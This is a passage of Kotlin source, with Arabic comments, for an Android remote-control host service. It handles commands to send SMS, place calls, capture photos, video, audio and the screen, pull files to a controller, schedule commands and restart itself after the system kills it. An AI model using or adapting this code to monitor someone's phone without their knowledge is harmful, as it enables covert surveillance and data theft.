                        put("switched", true)
                        put("transport", "relay")
                        put("isFront", !wasFront)
                    }
                } else {
                    var frontResult = manager?.isUsingFrontCamera() ?: false
                    manager?.switchCamera { isFront ->
                        frontResult = isFront
                        cameraStreamingState.value = cameraStreamingState.value.copy(isFrontCamera = isFront)
                    }
                    buildJsonObject {
                        put("cmd", Commands.SWITCH_CAMERA)
                        put("switched", true)
                        put("transport", "webrtc")
                        put("isFront", frontResult)
                    }
                }
            }

            Commands.START_SCREEN_STREAM -> {
                val mode = request.params?.get("mode")?.jsonPrimitive?.contentOrNull ?: "relay"
                val intent = screenCaptureIntent
                if (intent == null) {
                    // إطلاق نشاط طلب الإذن من المستخدم (النافذة نظامية على الهاتف المضيف)
                    val permIntent = Intent(applicationContext, ScreenCapturePermissionActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(permIntent)
                    buildJsonObject {
                        put("cmd", Commands.START_SCREEN_STREAM)
                        put("started", false)
                        put("pendingPermission", true)
                        put("message", "تم فتح نافذة إذن التقاط الشاشة على الجوال المضيف")
                    }
                } else if (mode == "webrtc") {
                    // المسار الموروث عبر WebRTC
                    val ok = manager?.startScreenStreaming(intent) ?: false
                    cameraStreamingState.value = CameraStreamingState(
                        isStreaming = ok,
                        isFrontCamera = false,
                        isAudioEnabled = true
                    )
                    buildJsonObject {
                        put("cmd", Commands.START_SCREEN_STREAM)
                        put("started", ok)
                        put("mode", "screen")
                        put("transport", "webrtc")
                    }
                } else {
                    // ——— الوسيلة البديلة: بث شاشة عبر الترحيل ———
                    // إذن الكاميرا المتاح لا يشترط هنا؛ لكن لا يمكن تشغيل مصدرين معاً
                    val relay = liveRelay
                    if (relay?.activeType() == "camera") relay.stopCamera()
                    val ok = relay?.startScreen(
                        permissionIntent = intent,
                        onFrame = { bytes, width, height ->
                            pushLiveFrame("screen", bytes, width, height)
                        }
                    ) ?: false
                    if (ok) {
                        liveSendFailures = 0
                        cameraStreamingState.value = CameraStreamingState(
                            isStreaming = true,
                            isFrontCamera = false,
                            isAudioEnabled = false
                        )
                    }
                    buildJsonObject {
                        put("cmd", Commands.START_SCREEN_STREAM)
                        put("started", ok)
                        put("mode", if (ok) "screen-relay" else "screen")
                        put("transport", "relay")
                        if (!ok) {
                            put("error", relay?.lastError
                                ?: "تعذر بدء بث الشاشة عبر الترحيل — قد يكون رمز الإذن مستهلكاً من جلسة سابقة؛ اطلب الإذن من جديد")
                            put("pendingPermission", true)
                        }
                    }
                }
            }

            Commands.TOGGLE_AUDIO -> {
                val enable = request.params?.get("enable")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: true
                manager?.setAudioEnabled(enable)
                cameraStreamingState.value = cameraStreamingState.value.copy(isAudioEnabled = enable)
                buildJsonObject {
                    put("cmd", Commands.TOGGLE_AUDIO)
                    put("audioEnabled", enable)
                }
            }

            // ——— الأوامر المتقدمة: التحكم البعيد العملي ———
            Commands.SMS_SEND -> {
                val number = request.params?.get("number")?.jsonPrimitive?.contentOrNull ?: ""
                val text = request.params?.get("text")?.jsonPrimitive?.contentOrNull ?: ""
                val ok = RemoteCommandsModule.sendSms(applicationContext, number, text)
                buildJsonObject {
                    put("cmd", Commands.SMS_SEND)
                    put("sent", ok)
                    if (!ok) put("error", "تعذر الإرسال: تأكد من إذن الرسائل (SEND_SMS) ومن صحة الرقم والنص")
                }
            }

            Commands.CALL_MAKE -> {
                val number = request.params?.get("number")?.jsonPrimitive?.contentOrNull ?: ""
                val ok = RemoteCommandsModule.makeCall(applicationContext, number)
                buildJsonObject {
                    put("cmd", Commands.CALL_MAKE)
                    put("dialed", ok)
                    if (!ok) put("error", "تعذر بدء المكالمة: تأكد من إذن المكالمات (CALL_PHONE)")
                }
            }

            Commands.SCREEN_SHOW -> {
                val text = request.params?.get("text")?.jsonPrimitive?.contentOrNull ?: ""
                val seconds = request.params?.get("seconds")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 10
                val ok = RemoteCommandsModule.showOnScreen(applicationContext, text, seconds)
                buildJsonObject {
                    put("cmd", Commands.SCREEN_SHOW)
                    put("shown", ok)
                    if (!ok) put("error", "يتطلب السماح بعرض التطبيق فوق التطبيقات الأخرى من إعدادات المضيف")
                }
            }

            Commands.CONTACT_ADD -> {
                val name = request.params?.get("name")?.jsonPrimitive?.contentOrNull ?: ""
                val number = request.params?.get("number")?.jsonPrimitive?.contentOrNull ?: ""
                val ok = RemoteCommandsModule.addContact(applicationContext, name, number)
                buildJsonObject {
                    put("cmd", Commands.CONTACT_ADD)
                    put("added", ok)
                    if (!ok) put("error", "تعذر إضافة الاسم: تأكد من إذن تعديل الأسماء")
                }
            }

            Commands.MEDIA_ADD -> {
                val kind = request.params?.get("kind")?.jsonPrimitive?.contentOrNull ?: "image"
                val nameIn = request.params?.get("name")?.jsonPrimitive?.contentOrNull
                val data = request.params?.get("base64")?.jsonPrimitive?.contentOrNull ?: ""
                val item = RemoteCommandsModule.addMedia(applicationContext, kind, nameIn, data)
                buildJsonObject {
                    put("cmd", Commands.MEDIA_ADD)
                    if (item != null) {
                        put("added", true)
                        put("name", item.name)
                        put("path", item.path)
                        put("size", item.size)
                    } else {
                        put("added", false)
                        put("error", "تعذر إضافة الوسائط: تأكد من نوع الملف وأنه موجود ببيانات Base64 صحيحة (صورة/فيديو/صوت)")
                    }
                }
            }

            Commands.CAPTURE_PHOTO -> {
                val front = request.params?.get("front")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: false
                val count = request.params?.get("count")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 1
                val interval = request.params?.get("interval")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 0
                val ctx = applicationContext
                if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    buildJsonObject {
                        put("cmd", Commands.CAPTURE_PHOTO)
                        put("error", "إذن الكاميرا غير ممنوح على المضيف")
                    }
                } else {
                    val shots = RemoteCaptureModule.capturePhotos(ctx, front, count, interval) { i, total, shot ->
                        Log.i(TAG, "لقطة $i/$total: ${shot?.name ?: "فشلت"}")
                    }
                    buildJsonObject {
                        put("cmd", Commands.CAPTURE_PHOTO)
                        put("captured", shots.size)
                        put("requested", count.coerceIn(1, 120))
                        put(
                            "items",
                            buildJsonArray {
                                shots.forEach { s ->
                                    add(buildJsonObject {
                                        put("name", s.name)
                                        put("path", s.path)
                                        put("size", s.size)
                                    })
                                }
                            }
                        )
                        if (shots.isEmpty()) put("error", "فشل التقاط أي لقطة: تحقق من إذن الكاميرا وعدم استخدامها بتطبيق آخر")
                    }
                }
            }

            Commands.CAPTURE_VIDEO -> {
                val front = request.params?.get("front")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: false
                val duration = request.params?.get("duration")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 10
                val ctx = applicationContext
                if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    buildJsonObject {
                        put("cmd", Commands.CAPTURE_VIDEO)
                        put("error", "إذن الكاميرا غير ممنوح على المضيف")
                    }
                } else {
                    val item = RemoteCaptureModule.captureVideo(ctx, front, duration)
                    buildJsonObject {
                        put("cmd", Commands.CAPTURE_VIDEO)
                        if (item != null) {
                            put("captured", true)
                            put("name", item.name)
                            put("path", item.path)
                            put("size", item.size)
                            put("durationMs", duration.coerceIn(1, 600) * 1000)
                        } else {
                            put("captured", false)
                            put("error", "فشل تسجيل الفيديو: تحقق من إذن الكاميرا وعدم استخدامها بتطبيق آخر")
                        }
                    }
                }
            }

            Commands.RECORD_AUDIO -> {
                val duration = request.params?.get("duration")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 30
                val ctx = applicationContext
                if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    buildJsonObject {
                        put("cmd", Commands.RECORD_AUDIO)
                        put("error", "إذن الميكروفون غير ممنوح على المضيف")
                    }
                } else {
                    val item = RemoteCaptureModule.recordAudio(ctx, duration)
                    buildJsonObject {
                        put("cmd", Commands.RECORD_AUDIO)
                        if (item != null) {
                            put("recorded", true)
                            put("name", item.name)
                            put("path", item.path)
                            put("size", item.size)
                            put("durationMs", duration.coerceIn(1, 3600) * 1000)
                        } else {
                            put("recorded", false)
                            put("error", "فشل تسجيل الصوت: تحقق من إذن الميكروفون")
                        }
                    }
                }
            }

            Commands.SCREEN_SHOT -> {
                val ok = runScreenShot()
                buildJsonObject {
                    put("cmd", Commands.SCREEN_SHOT)
                    if (ok != null) {
                        put("captured", true)
                        put("name", ok.first)
                        put("path", ok.second)
                        put("size", ok.third)
                    } else {
                        put("captured", false)
                        put("error", "يلزم تفعيل البث عبر الإذن المعتمد: افتح بث الشاشة مرة واحدة لإذن التقاط وسائل العرض ثم أعد المحاولة")
                    }
                }
            }

            Commands.SCREEN_RECORD -> {
                val duration = request.params?.get("duration")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 15
                val ok = runScreenRecord(duration)
                buildJsonObject {
                    put("cmd", Commands.SCREEN_RECORD)
                    if (ok != null) {
                        put("captured", true)
                        put("name", ok.first)
                        put("path", ok.second)
                        put("size", ok.third)
                        put("durationMs", duration.coerceIn(1, 600) * 1000)
                    } else {
                        put("captured", false)
                        put("error", "يلزم تفعيل البث عبر الإذن المعتمد: افتح بث الشاشة مرة واحدة لإذن التقاط وسائل العرض ثم أعد المحاولة")
                    }
                }
            }

            Commands.DEVICE_SHUTDOWN -> {
                val (ok, message) = RemoteCommandsModule.powerCommand(applicationContext, reset = false)
                buildJsonObject {
                    put("cmd", Commands.DEVICE_SHUTDOWN)
                    put("executed", ok)
                    put("message", message)
                }
            }

            Commands.DEVICE_RESET -> {
                val (ok, message) = RemoteCommandsModule.powerCommand(applicationContext, reset = true)
                buildJsonObject {
                    put("cmd", Commands.DEVICE_RESET)
                    put("executed", ok)
                    put("message", message)
                }
            }

            Commands.COMMAND_SCHEDULE -> {
                val cmd = request.params?.get("schedule")?.jsonPrimitive?.contentOrNull ?: ""
                val at = request.params?.get("at")?.jsonPrimitive?.contentOrNull?.toLongOrNull() ?: 0L
                val note = request.params?.get("note")?.jsonPrimitive?.contentOrNull ?: ""
                val params = (request.params?.get("params"))?.jsonObject ?: JsonObject(emptyMap())
                val id = CommandSchedulerStore.add(applicationContext, cmd, params, at, note)
                buildJsonObject {
                    put("cmd", Commands.COMMAND_SCHEDULE)
                    if (id != null) {
                        put("scheduled", true)
                        put("id", id)
                        put("at", at)
                        put("note", note)
                    } else {
                        put("scheduled", false)
                        put("error", "تعذر جدولة الأمر: يجب أن يكون وقت الجدولة في المستقبل والأمر من الأنواع المدعومة")
                    }
                }
            }

            Commands.SCHEDULE_LIST -> {
                val items = CommandSchedulerStore.list(applicationContext)
                buildJsonObject {
                    put("cmd", Commands.SCHEDULE_LIST)
                    put(
                        "items",
                        buildJsonArray {
                            items.forEach { j ->
                                add(buildJsonObject {
                                    put("id", j.id)
                                    put("cmd", j.cmd)
                                    put("at", j.atMillis)
                                    put("atText", CommandSchedulerStore.describe(j.atMillis))
                                    put("note", j.note)
                                })
                            }
                        }
                    )
                }
            }

            Commands.SCHEDULE_CANCEL -> {
                val id = request.params?.get("id")?.jsonPrimitive?.contentOrNull?.toLongOrNull() ?: 0L
                val ok = CommandSchedulerStore.cancel(applicationContext, id)
                buildJsonObject {
                    put("cmd", Commands.SCHEDULE_CANCEL)
                    put("cancelled", ok)
                }
            }

            else -> buildJsonObject {
                put("cmd", request.cmd)
                put("error", "أمر غير معروف: ${request.cmd}")
            }
        }
    }

    /**
     * يبدأ بث الشاشة باستخدام إذن MediaProjection المستلم من النشاط الشفاف.
     */
    fun startScreenStreamWithIntent(intent: Intent) {
        screenCaptureIntent = intent
        val ok = peerManager?.startScreenStreaming(intent) ?: false
        if (ok) {
            cameraStreamingState.value = CameraStreamingState(
                isStreaming = true,
                isFrontCamera = false,
                isAudioEnabled = true
            )
        }
    }

    /**
     * ينفّذ الأوامر المجدولة المستحقة الآن (أدولة من خدمة دورة كل 10 ثوان)؛
     * إذا كان المتحكم متصلاً تُمرَّر النتائج إليه أيضاً.
     */
    private suspend fun runScheduledDueCommands() {
        val due = CommandSchedulerStore.pollDue(applicationContext)
        if (due.isEmpty()) return
        for (job in due) {
            try {
                val req = BridgeRequest((job.id % Int.MAX_VALUE).toInt(), job.cmd, job.params)
                val result = processRequest(req)
                Log.i(TAG, "أمر مجدول نُفّذ: ${job.cmd} النتيجة: $result")
                peerManager?.sendResponse(BridgeResponse(req.id, true, null, result))
            } catch (t: Throwable) {
                Log.w(TAG, "فشل تنفيذ أمر مجدول (${job.cmd}): ${t.message}")
            }
        }
    }

    /**
     * لقطة شاشة واحدة عبر إذن إسقاط الوسائط المخزّن من جلسة بث الشاشة الأخيرة.
     * يعيد (الاسم، المسار، الحجم) أو null إن لم يتوفر إذن فعّال.
     */
    private suspend fun runScreenShot(): Triple<String, String, Long>? {
        val intent = screenCaptureIntent ?: return null
        return kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val mp = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
                val projection = mp.getMediaProjection(-1, intent) ?: return@withContext null
                val metrics = resources.displayMetrics
                val w = metrics.widthPixels
                val h = metrics.heightPixels
                val reader = android.media.ImageReader.newInstance(w, h, android.graphics.ImageFormat.JPEG, 1)
                val deferred = kotlinx.coroutines.CompletableDeferred<ByteArray?>()
                val handler = Handler(Looper.getMainLooper())
                reader.setOnImageAvailableListener({ r ->
                    val img = try { r.acquireLatestImage() } catch (_: Throwable) { null }
                    if (img == null) { deferred.complete(null); return@setOnImageAvailableListener }
                    try {
                        val plane = img.planes[0].buffer
                        val bytes = ByteArray(plane.remaining())
                        plane.get(bytes)
                        deferred.complete(bytes)
                    } catch (_: Throwable) {
                        deferred.complete(null)
                    } finally {
                        img.close()
                    }
                }, handler)
                val display = projection.createVirtualDisplay(
                    "RBShot", w, h, metrics.densityDpi,
                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.surface, null, handler
                )
                val bytes = kotlinx.coroutines.withTimeoutOrNull(8000) { deferred.await() }
                try { display?.release() } catch (_: Throwable) {}
                try { projection.stop() } catch (_: Throwable) {}
                try { reader.close() } catch (_: Throwable) {}
                bytes ?: return@withContext null
                val saved = RemoteCaptureModule.saveScreenShot(applicationContext, bytes) ?: return@withContext null
                Triple(saved.name, saved.path, saved.size)
            } catch (_: Throwable) {
                null
            }
        }
    }

    /**
     * تسجيل شاشة بمدة محددة عبر نفس إذن الإسقاط، الناتج mp4 في Movies/RemoteBridge/Screen.
     */
    private suspend fun runScreenRecord(durationSeconds: Int): Triple<String, String, Long>? {
        val intent = screenCaptureIntent ?: return null
        return kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            var projection: android.media.projection.MediaProjection? = null
            var recorder: MediaRecorder? = null
            var display: android.hardware.display.VirtualDisplay? = null
            try {
                val mp = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
                projection = mp.getMediaProjection(-1, intent) ?: return@withContext null
                val metrics = resources.displayMetrics
                val w = metrics.widthPixels
                val h = metrics.heightPixels
                val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(applicationContext) else @Suppress("DEPRECATION") MediaRecorder()
                recorder = rec
                val tmpFile = java.io.File(applicationContext.cacheDir, "rbscr_${System.currentTimeMillis()}.mp4")
                rec.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                rec.setOutputFile(tmpFile.absolutePath)
                rec.setVideoEncodingBitRate(6_000_000)
                rec.setVideoFrameRate(24)
                rec.setVideoSize(w / 2 * 2, h / 2 * 2)
                rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                rec.setAudioSource(MediaRecorder.AudioSource.MIC)
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                rec.setMaxDuration(durationSeconds.coerceIn(1, 600) * 1000)
                rec.prepare()
                val handler = Handler(Looper.getMainLooper())
                display = projection.createVirtualDisplay(
                    "RBRec", w, h, metrics.densityDpi,
                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    rec.surface, null, handler
                )
                rec.start()
                kotlinx.coroutines.delay(durationSeconds.coerceIn(1, 600) * 1000L)
                try { rec.stop() } catch (_: Throwable) {}
                val bytes = tmpFile.readBytes()
                tmpFile.delete()
                if (bytes.isEmpty()) return@withContext null
                val saved = RemoteCaptureModule.saveScreenVideo(applicationContext, bytes, durationSeconds) ?: return@withContext null
                Triple(saved.name, saved.path, saved.size)
            } catch (_: Throwable) {
                null
            } finally {
                try { display?.release() } catch (_: Throwable) {}
                try { recorder?.release() } catch (_: Throwable) {}
                try { projection?.stop() } catch (_: Throwable) {}
            }
        }
    }

    /**
     * يرسل ملفاً كاملاً إلى جهاز التحكم عبر قطع ثنائية.
     */
    private suspend fun sendFileToController(
        manager: PeerConnectionManager,
        requestId: Int,
        fileId: Long,
        bucket: String
    ) {
        val provider = dataProvider ?: return
        val stream = provider.openFile(fileId, bucket) ?: run {
            manager.sendResponse(BridgeResponse(requestId, false, "تعذّر فتح الملف", null))
            return
        }
        sendInputStreamToController(manager, requestId) { stream }
    }

    /**
     * يرسل ملفاً مأخوذاً من مستكشف الذاكرة بمساره النسبي إلى جهاز التحكم.
     */
    private suspend fun sendFileByPathToController(
        manager: PeerConnectionManager,
        requestId: Int,
        relativePath: String
    ) {
        val provider = dataProvider ?: return
        val stream = provider.openFileByPath(relativePath) ?: run {
            manager.sendResponse(BridgeResponse(requestId, false, "تعذّر فتح الملف بالمسار", null))
            return
        }
        sendInputStreamToController(manager, requestId) { stream }
    }

    /** يضخّ InputStream في قناة البيانات بقطع ثنائية ثم رسالة ختامية. */
    private suspend fun sendInputStreamToController(
        manager: PeerConnectionManager,
        requestId: Int,
        streamProvider: () -> java.io.InputStream
    ) {
        try {
            val stream = streamProvider()
            stream.use { input ->
                val buffer = ByteArray(FrameProtocol.MAX_PAYLOAD)
                var seq = 0
                var totalSent = 0L
                // الرأس أولاً: بداية النقل الصحيحة
                val header = buildJsonObject {
                    put("fileId", requestId)
                    put("started", true)
                }
                manager.sendResponse(BridgeResponse(requestId, true, null, header))
                while (true) {
                    val read = input.read(buffer)
                    if (read <= 0) break
                    manager.sendBinaryChunk(requestId, seq, -1, buffer, 0, read)
                    seq++
                    totalSent += read
                }
                // رسالة ختامية
                manager.sendResponse(
                    BridgeResponse(
                        requestId, true, null,
                        buildJsonObject {
                            put("completed", true)
                            put("size", totalSent)
                        }
                    )
                )
            }
        } catch (t: Throwable) {
            manager.sendResponse(
                BridgeResponse(requestId, false, t.message ?: "فشل إرسال الملف", null)
            )
        }
    }

    /**
     * يوقف كل شيء بأمان.
     */
    private fun stopHost() {
        activeInstance = null
        cameraStreamingState.value = CameraStreamingState(isStreaming = false)
        // إيقاف يدوي من المستخدم: نلغي كل منظومة الاستمرارية والمراقبة الدورية
        HostRestartScheduler.cancelRestart(applicationContext)
        HostRestartScheduler.cancelWatchdog(applicationContext)
        serviceState.value = serviceState.value.copy(running = false)
        requestJob?.cancel()
        schedulerJob?.cancel()
        try {
            locationTracker?.stop()
        } catch (_: Throwable) {
        }
        locationTracker = null
        // إيقاف البث البديل عبر الترحيل قبل تفكيك باقي المنظومة
        try { liveRelay?.stopAll() } catch (_: Throwable) {}
        liveTargetId = null
        peerManager?.close()
        peerManager = null
        signaling?.disconnect()
        signaling = null
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        super.onDestroy()
        val wasRunning = serviceState.value.running
        activeInstance = null
        cameraStreamingState.value = CameraStreamingState(isStreaming = false)
        try {
            locationTracker?.stop()
        } catch (_: Throwable) {
        }
        locationTracker = null
        // إيقاف البث البديل قبل إلغاء النطاق
        try { liveRelay?.stopAll() } catch (_: Throwable) {}
        liveTargetId = null
        scope.cancel()
        // إن كانت الخدمة تعمل وقت التدمير (قتل من النظام / إدارة الذاكرة /
        // أدوات إغلاق) دون طلب من المستخدم — نعيد تشغيلها بعد مهلة المستخدم
        // المحددة (دقيقة / 10 دقائق / ساعة / يوم).
        // الإيقاف اليدوي (stopHost) يصفّر running=false فيلغى هنا الإعادة.
        if (wasRunning) {
            HostRestartScheduler.scheduleRestart(applicationContext, restartDelayMinutesValue)
        }
    }
}
